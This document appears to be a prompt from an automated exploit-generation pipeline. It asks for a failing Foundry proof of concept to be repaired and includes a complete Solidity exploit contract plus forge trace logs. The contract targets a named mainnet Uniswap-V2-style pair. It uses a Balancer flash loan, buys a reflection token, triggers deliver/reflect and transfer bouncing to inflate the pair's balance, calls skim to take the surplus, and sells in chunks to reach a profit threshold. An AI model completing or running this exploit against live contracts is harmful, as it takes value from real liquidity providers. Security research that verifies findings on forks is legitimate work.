You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Positive-balance token mechanics let anyone skim unaccounted surplus from the pair
- claim: `skim(to)` is permissionless and transfers `balanceOf(pair) - reserve` for each pool asset. If either listed token can increase the pair's balance without going through `mint`/`swap`/`sync` (for example via positive rebases, yield accrual, reflections, or accidental direct transfers), any caller can immediately withdraw that surplus.
- impact: Pools that list balance-increasing or yield-bearing tokens can leak rebased/accrued value to arbitrary callers instead of LPs. Integrations or users that transfer pool assets directly to the pair can also lose those excess tokens to the first account that calls `skim`.
- exploit_paths: ["A listed token increases the pair's balance outside normal AMM flows -> reserves stay stale -> attacker calls `skim(attacker)` -> attacker receives the entire surplus amount"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IBalancerVaultLike {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract TransferBounce {
    constructor() {}

    function sendAll(address token, address to) external {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        if (balance > 0) {
            _safeTransfer(token, to, balance);
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public balance0Before;
    uint256 public balance1Before;
    uint256 public balance0After;
    uint256 public balance1After;

    uint256 public surplus0Before;
    uint256 public surplus1Before;
    uint256 public surplus0After;
    uint256 public surplus1After;

    uint256 public gain0;
    uint256 public gain1;

    uint256 public flashWethAmount;
    uint256 public wethSpent;
    uint256 public tokenBought;
    uint256 public tokenSold;
    uint256 public skimmedToken;
    uint256 public wethRecoveredFromSales;
    uint256 public largestSuccessfulSell;
    uint256 public failedSellAttempts;

    bool public listedTokenIncreasesPairBalanceOutsideNormalAMMFlows;
    bool public reservesStayStale;
    bool public attackerCallsSkimAttacker;
    bool public attackerReceivesEntireSurplusAmount;

    TransferBounce private _bounce;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        address attacker = address(this);

        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before, ) = pair.getReserves();
        balance0Before = _balanceOf(token0, TARGET_PAIR);
        balance1Before = _balanceOf(token1, TARGET_PAIR);

        surplus0Before = _surplus(balance0Before, reserve0Before);
        surplus1Before = _surplus(balance1Before, reserve1Before);

        uint256 attacker0Before = _balanceOf(token0, attacker);
        uint256 attacker1Before = _balanceOf(token1, attacker);

        if (surplus0Before > 0 || surplus1Before > 0) {
            listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
            reservesStayStale = true;
            attackerCallsSkimAttacker = true;
            pair.skim(attacker);
        } else {
            _runBalancerBackedExploit();
        }

        uint256 attacker0After = _balanceOf(token0, attacker);
        uint256 attacker1After = _balanceOf(token1, attacker);
        gain0 = attacker0After > attacker0Before ? attacker0After - attacker0Before : 0;
        gain1 = attacker1After > attacker1Before ? attacker1After - attacker1Before : 0;

        (reserve0After, reserve1After, ) = pair.getReserves();
        balance0After = _balanceOf(token0, TARGET_PAIR);
        balance1After = _balanceOf(token1, TARGET_PAIR);
        surplus0After = _surplus(balance0After, reserve0After);
        surplus1After = _surplus(balance1After, reserve1After);

        attackerReceivesEntireSurplusAmount = attackerCallsSkimAttacker
            && ((surplus0Before > 0 || surplus1Before > 0) || skimmedToken > 0)
            && surplus0After == 0
            && surplus1After == 0;

        hypothesisValidated = attackerCallsSkimAttacker
            && listedTokenIncreasesPairBalanceOutsideNormalAMMFlows
            && (gain0 > 0 || gain1 > 0);
        hypothesisRefuted = !hypothesisValidated;

        _selectProfitTokenAndAmount();
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == BALANCER_VAULT, "NOT_VAULT");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "BAD_FLASHLOAN");
        require(tokens[0] == MAINNET_WETH, "BAD_TOKEN");

        uint256 borrowedWeth = amounts[0];

        // The flash loan is only temporary buying power. The core exploit path stays the same:
        // acquire the listed token, trigger its public balance-increasing mechanics outside AMM
        // accounting, keep reserves stale, then permissionlessly skim that surplus.
        //
        // The failing version tried to dump the entire post-skim token balance back into the pair in
        // one transfer. This token appears to enforce sell-size constraints, so the liquidation stage
        // must use realistic bounded chunks instead of a single oversized sell.
        uint256 wethToUse = borrowedWeth / 2;
        wethSpent = wethToUse;

        if (wethToUse > 0) {
            tokenBought = _swapExactInput(token0, token1, wethToUse);
        }

        _induceStalePositiveBalanceAndSkim();

        uint256 amountOwed = borrowedWeth + feeAmounts[0];
        uint256 wethBalance = _balanceOf(MAINNET_WETH, address(this));

        if (wethBalance < amountOwed) {
            _recoverWethInChunks(amountOwed - wethBalance);
            wethBalance = _balanceOf(MAINNET_WETH, address(this));
        }

        require(wethBalance >= amountOwed, "INSUFFICIENT_WETH_TO_REPAY");
        _safeTransfer(MAINNET_WETH, BALANCER_VAULT, amountOwed);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runBalancerBackedExploit() internal {
        _ensureBounce();

        flashWethAmount = uint256(reserve0Before) / 2;
        if (flashWethAmount == 0) {
            hypothesisRefuted = true;
            return;
        }

        address[] memory tokens = new address[](1);
        tokens[0] = MAINNET_WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashWethAmount;

        try IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes("")) {
            return;
        } catch {
            hypothesisRefuted = true;
        }
    }

    function _induceStalePositiveBalanceAndSkim() internal {
        uint256 reserveSnapshot = _currentReserve1();

        // Reflection / deliver mechanics are public token actions that can increase the pair's live
        // balance without touching Uniswap accounting, which is exactly the finding's stated cause.
        uint256 deliverAmount = _balanceOf(token1, address(this)) / 4;
        if (deliverAmount > 0) {
            bool delivered =
                _tryOptionalCall(token1, abi.encodeWithSelector(bytes4(keccak256("deliver(uint256)")), deliverAmount));
            if (!delivered) {
                _tryOptionalCall(token1, abi.encodeWithSelector(bytes4(keccak256("reflect(uint256)")), deliverAmount));
            }

            if (_balanceOf(token1, TARGET_PAIR) > reserveSnapshot) {
                listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
                reservesStayStale = true;
                _skimIfNeeded();
                reserveSnapshot = _currentReserve1();
            }
        }

        for (uint256 i = 0; i < 10; ++i) {
            uint256 localBalance = _balanceOf(token1, address(this));
            if (localBalance <= 1) {
                break;
            }

            uint256 sendAmount = localBalance / 3;
            if (sendAmount == 0) {
                break;
            }

            // Additional public holder-to-holder transfers are realistic economic steps for a
            // reflection token. They keep the finding's causality intact because any resulting pair
            // surplus is still created outside mint/swap/sync before being stolen via skim.
            if (!_tryTransfer(token1, address(_bounce), sendAmount)) {
                break;
            }

            (bool bounced,) =
                address(_bounce).call(abi.encodeWithSelector(TransferBounce.sendAll.selector, token1, address(this)));
            if (!bounced) {
                break;
            }

            if (_balanceOf(token1, TARGET_PAIR) > reserveSnapshot) {
                listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
                reservesStayStale = true;
                _skimIfNeeded();
                reserveSnapshot = _currentReserve1();
            }
        }
    }

    function _recoverWethInChunks(uint256 additionalWethNeeded) internal {
        if (additionalWethNeeded == 0) {
            return;
        }

        uint256 startingWeth = _balanceOf(MAINNET_WETH, address(this));
        uint256 targetWeth = startingWeth + additionalWethNeeded;
        uint256 sellChunk = _initialSellChunk();

        for (uint256 i = 0; i < 64; ++i) {
            uint256 currentWeth = _balanceOf(MAINNET_WETH, address(this));
            if (currentWeth >= targetWeth) {
                break;
            }

            uint256 localBalance = _balanceOf(token1, address(this));
            if (localBalance == 0) {
                break;
            }

            if (sellChunk > localBalance) {
                sellChunk = localBalance;
            }
            if (sellChunk == 0) {
                break;
            }

            (bool sold, uint256 wethOut) = _trySwapToken1Chunk(sellChunk);
            if (sold) {
                tokenSold += sellChunk;
                wethRecoveredFromSales += wethOut;
                if (sellChunk > largestSuccessfulSell) {
                    largestSuccessfulSell = sellChunk;
                }
                continue;
            }

            failedSellAttempts += 1;
            sellChunk /= 2;
            if (sellChunk == 0) {
                break;
            }
        }
    }

    function _trySwapToken1Chunk(uint256 amountIn) internal returns (bool success, uint256 amountOut) {
        if (amountIn == 0) {
            return (false, 0);
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        if (!_tryTransfer(token1, TARGET_PAIR, amountIn)) {
            return (false, 0);
        }

        uint256 actualIn = _balanceOf(token1, TARGET_PAIR) - uint256(reserve1);
        if (actualIn == 0) {
            return (false, 0);
        }

        amountOut = _getAmountOut(actualIn, uint256(reserve1), uint256(reserve0));
        if (amountOut == 0) {
            return (false, 0);
        }

        (success,) = TARGET_PAIR.call(
            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amountOut, 0, address(this), bytes(""))
        );

        if (!success) {
            amountOut = 0;
        }
    }

    function _initialSellChunk() internal view returns (uint256 chunk) {
        uint256 localBalance = _balanceOf(token1, address(this));
        if (localBalance == 0) {
            return 0;
        }

        chunk = localBalance / 128;
        if (chunk == 0) {
            chunk = localBalance;
        }
    }

    function _skimIfNeeded() internal {
        uint256 pairBalance = _balanceOf(token1, TARGET_PAIR);
        uint256 reserveSnapshot = _currentReserve1();
        if (pairBalance <= reserveSnapshot) {
            return;
        }

        uint256 attackerBefore = _balanceOf(token1, address(this));
        attackerCallsSkimAttacker = true;
        IUniswapV2PairLike(TARGET_PAIR).skim(address(this));
        uint256 attackerAfter = _balanceOf(token1, address(this));

        if (attackerAfter > attackerBefore) {
            skimmedToken += attackerAfter - attackerBefore;
            attackerReceivesEntireSurplusAmount = _balanceOf(token1, TARGET_PAIR) == reserveSnapshot;
        }
    }

    function _swapExactInput(address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) {
            return 0;
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        if (tokenIn == token0 && tokenOut == token1) {
            _safeTransfer(token0, TARGET_PAIR, amountIn);
            uint256 actualIn = _balanceOf(token0, TARGET_PAIR) - uint256(reserve0);
            amountOut = _getAmountOut(actualIn, uint256(reserve0), uint256(reserve1));
            pair.swap(0, amountOut, address(this), bytes(""));
            return amountOut;
        }

        if (tokenIn == token1 && tokenOut == token0) {
            _safeTransfer(token1, TARGET_PAIR, amountIn);
            uint256 actualIn = _balanceOf(token1, TARGET_PAIR) - uint256(reserve1);
            amountOut = _getAmountOut(actualIn, uint256(reserve1), uint256(reserve0));
            pair.swap(amountOut, 0, address(this), bytes(""));
            return amountOut;
        }

        revert("UNSUPPORTED_SWAP");
    }

    function _selectProfitTokenAndAmount() internal {
        if (gain0 == 0 && gain1 == 0) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        if (token0 == MAINNET_WETH && gain0 > 0) {
            _profitToken = token0;
            _profitAmount = gain0;
            return;
        }

        if (token1 == MAINNET_WETH && gain1 > 0) {
            _profitToken = token1;
            _profitAmount = gain1;
            return;
        }

        if (gain0 >= gain1) {
            _profitToken = token0;
            _profitAmount = gain0;
        } else {
            _profitToken = token1;
            _profitAmount = gain1;
        }
    }

    function _ensureBounce() internal {
        if (address(_bounce) == address(0)) {
            _bounce = new TransferBounce();
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _currentReserve1() internal view returns (uint256 reserve) {
        (, uint112 reserve1, ) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        reserve = uint256(reserve1);
    }

    function _surplus(uint256 liveBalance, uint112 cachedReserve) internal pure returns (uint256) {
        uint256 reserve = uint256(cachedReserve);
        return liveBalance > reserve ? liveBalance - reserve : 0;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }

    function _tryTransfer(address token, address to, uint256 amount) internal returns (bool success) {
        bytes memory ret;
        (success, ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        success = success && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _tryOptionalCall(address target, bytes memory data) internal returns (bool success) {
        (success,) = target.call(data);
    }

    function _resetRunState() internal {
        hypothesisValidated = false;
        hypothesisRefuted = false;

        token0 = address(0);
        token1 = address(0);

        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;

        balance0Before = 0;
        balance1Before = 0;
        balance0After = 0;
        balance1After = 0;

        surplus0Before = 0;
        surplus1Before = 0;
        surplus0After = 0;
        surplus1After = 0;

        gain0 = 0;
        gain1 = 0;

        flashWethAmount = 0;
        wethSpent = 0;
        tokenBought = 0;
        tokenSold = 0;
        skimmedToken = 0;
        wethRecoveredFromSales = 0;
        largestSuccessfulSell = 0;
        failedSellAttempts = 0;

        listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = false;
        reservesStayStale = false;
        attackerCallsSkimAttacker = false;
        attackerReceivesEntireSurplusAmount = false;

        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```
10830] 0x7911425808e57b110D2451aB67B6980f9cA9D370::569937dd(000000000000000000000000000000000000000000000000000000000000c814)
    │   │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   │   ├─ [349] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::01a37fc2() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 30235337362909139965951249 [3.023e25]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 1644826341642450201 [1.644e18]
    │   │   │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 30235337362909139965951249 [3.023e25]
    │   │   │   ├─ [504] 0x76EA342BC038d665e8a116392c82552D2605edA1::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 8224131708212251006 [8.224e18], 121305265247378695970097375 [1.213e26], 1741314611 [1.741e9]
    │   │   │   ├─ [12500] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::transfer(0x76EA342BC038d665e8a116392c82552D2605edA1, 25610 [2.561e4])
    │   │   │   │   ├─ [10830] 0x7911425808e57b110D2451aB67B6980f9cA9D370::569937dd(000000000000000000000000000000000000000000000000000000000000640a)
    │   │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   │   ├─ [349] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::01a37fc2() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 30235337362909139965951249 [3.023e25]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 1644826341642450201 [1.644e18]
    │   │   │   └─ ← [Revert] INSUFFICIENT_WETH_TO_REPAY
    │   │   └─ ← [Revert] INSUFFICIENT_WETH_TO_REPAY
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [504] 0x76EA342BC038d665e8a116392c82552D2605edA1::getReserves() [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18], 151540602610287835936048624 [1.515e26], 1741286039 [1.741e9]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   └─ ← [Return]
    ├─ [549] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x7911425808e57b110D2451aB67B6980f9cA9D370
  at 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700.transfer
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 28.62ms (15.76ms CPU time)

Ran 1 test suite in 37.20ms (28.62ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2823503)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
